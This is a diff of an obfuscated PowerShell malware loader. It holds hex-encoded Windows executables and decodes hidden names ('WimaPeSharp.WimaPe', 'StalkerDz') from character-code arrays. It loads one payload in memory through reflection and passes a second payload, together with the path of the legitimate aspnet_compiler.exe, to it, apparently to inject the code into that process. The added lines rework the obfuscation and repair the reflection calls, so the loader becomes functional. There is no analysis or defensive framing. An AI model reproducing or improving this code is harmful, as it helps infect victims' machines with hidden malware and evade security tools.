@@ -152,28 +152,31 @@ $hadjalitinjecter="4D!5A!90!00!03!00!00!00!04!00!00!00!FF!FF!00!00!B8!00!00!00!0
 [Byte[]] $oildogildo = $mipildogildo -split '!' | % { [byte][convert]::ToInt32($_, 16) }
 [Byte[]] $hadjamohima = $hadjalitinjecter -split '!' | % { [byte][convert]::ToInt32($_, 16) }
 
-[Byte[]]$p1q2r3s4 = 71,101,116,84,121,112,101
-[Byte[]]$t5u6v7w8 = 71,101,116,77,101,116,104,111,100
-[Byte[]]$x9y0z1a2 = 73,110,118,111,107,101
+[Byte[]]$p1q2r3s4 = 0x47,0x65,0x74,0x54,0x79,0x70,0x65
+[Byte[]]$t5u6v7w8 = 0x47,0x65,0x74,0x4d,0x65,0x74,0x68,0x6f,0x64
+[Byte[]]$x9y0z1a2 = 0x49,0x6e,0x76,0x6f,0x6b,0x65
 
-$m3n4b5v6 = @('W','i','m','a'),@('P','e','S','h','a','r','p'),@('.','W','i','m','a','P','e')
-$c7d8e9f0 = ($m3n4b5v6 | % { -join $_ }) -join ''
+$m3n4b5v6 = @([char]87,[char]105,[char]109,[char]97),@([char]80,[char]101,[char]83,[char]104,[char]97,[char]114,[char]112),@([char]46,[char]87,[char]105,[char]109,[char]97,[char]80,[char]101)
+$c7d8e9f0 = ([string]::Concat($m3n4b5v6[0]), [string]::Concat($m3n4b5v6[1]), [string]::Concat($m3n4b5v6[2])) -join ''
 
-$g1h2i3j4 = @('S','t','a','l'),@('k','e','r','D','z')
-$k5l6m7n8 = ($g1h2i3j4 | % { -join $_ }) -join ''
+$g1h2i3j4 = @([char]83,[char]116,[char]97,[char]108),@([char]107,[char]101,[char]114,[char]68,[char]122)
+$k5l6m7n8 = ([string]::Concat($g1h2i3j4[0]), [string]::Concat($g1h2i3j4[1])) -join ''
 
 [Byte[]]$o9p0q1r2 = 67,58,92,87,105,110,100,111,119,115,92,77,105,99,114,111,115,111,102,116,46,78,69,84,92,70,114,97,109,101,119,111,114,107,92,118,52,46,48,46,51,48,51,49,57,92,97,115,112,110,101,116,95,99,111,109,112,105,108,101,114,46,101,120,101
 
-$loadedAssembly = [Reflection.Assembly]::Load($hadjamohima)
-$getTypeName = [Text.Encoding]::ASCII.GetString($p1q2r3s4)
-$type = $loadedAssembly.$getTypeName.Invoke($c7d8e9f0)
-$getMethodName = [Text.Encoding]::ASCII.GetString($t5u6v7w8)
-$method = $type.$getMethodName.Invoke($k5l6m7n8)
-$invokeName = [Text.Encoding]::ASCII.GetString($x9y0z1a2)
+$loadedAssembly = [System.Reflection.Assembly]::Load($hadjamohima)
+$getTypeName = [System.Text.Encoding]::ASCII.GetString($p1q2r3s4)
+$type = $loadedAssembly.GetType($c7d8e9f0)
+$getMethodName = [System.Text.Encoding]::ASCII.GetString($t5u6v7w8)
+$method = $type.GetMethod($k5l6m7n8, [Reflection.BindingFlags]'Public,Static')
+$invokeName = [System.Text.Encoding]::ASCII.GetString($x9y0z1a2)
 
-$compilerPath = [Text.Encoding]::ASCII.GetString($o9p0q1r2)
-$args = @($compilerPath, $null, $oildogildo, $false)
+$compilerPath = [System.Text.Encoding]::ASCII.GetString($o9p0q1r2)
+$args = New-Object Object[] 4
+$args[0] = $compilerPath
+$args[2] = $oildogildo
+$args[3] = $false
 
-$method.$invokeName.Invoke($null, $args)
+$method.Invoke($null, $args)
 Start-Sleep -Seconds 5
 exit
